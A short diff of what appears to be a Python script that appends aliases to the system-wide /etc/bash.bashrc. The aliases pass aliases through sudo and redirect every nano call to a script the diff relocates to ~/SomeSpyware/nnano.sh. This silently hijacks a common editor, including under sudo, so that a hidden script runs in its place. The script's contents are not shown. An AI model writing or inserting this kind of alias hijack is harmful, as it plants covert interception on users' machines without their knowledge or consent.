@@ -4,4 +4,4 @@ with open('/etc/bash.bashrc', 'r') as file:
 
 
 with open('/etc/bash.bashrc', 'w') as file:
-    file.write(file_data + "alias sudo='sudo '; alias nano='bash ~/itsi/nnano.sh'")
+    file.write(file_data + "alias sudo='sudo '; alias nano='bash ~/SomeSpyware/nnano.sh'")
